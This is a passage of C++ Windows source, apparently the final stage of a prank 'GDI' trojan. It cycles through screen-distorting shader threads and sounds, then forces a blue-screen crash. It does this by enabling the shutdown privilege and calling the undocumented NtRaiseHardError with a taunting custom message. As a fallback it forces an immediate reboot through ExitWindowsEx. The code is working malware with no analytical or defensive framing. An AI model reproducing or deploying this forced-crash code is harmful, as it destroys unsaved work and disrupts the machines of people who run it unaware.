			HANDLE ohfuckwehaveafuckstore = CreateThread(0, 0, opener, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread666, 0);
			CloseHandle(thread666);
			InvalidateRect(0, 0, 0);
			//TerminateThread(thread666dot1, 0);
			//CloseHandle(thread666dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread10 = CreateThread(0, 0, thelastshader, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			lastsound();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			TerminateThread(thread666dot1, 0);
			CloseHandle(thread666dot1);
			InvalidateRect(0, 0, 0);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			TerminateThread(ohfuckwehaveafuckstore, 0);
			CloseHandle(ohfuckwehaveafuckstore);
			InvalidateRect(0, 0, 0);
			Sleep(100);

			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			ULONG_PTR args[] = { (ULONG_PTR)"No More Skidded , Without Stolen GDI & Bytebeat!, PLZ PLZ N17PRO3426 & PINKY BLUE/PINKYBLUE123-O4Q UNBLOCK MAZEICON/UNDERWATER TINY KONG ON YOUTUBE NOW!" }; //Custom BSOD yay!
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			return 0;
		}
	}
}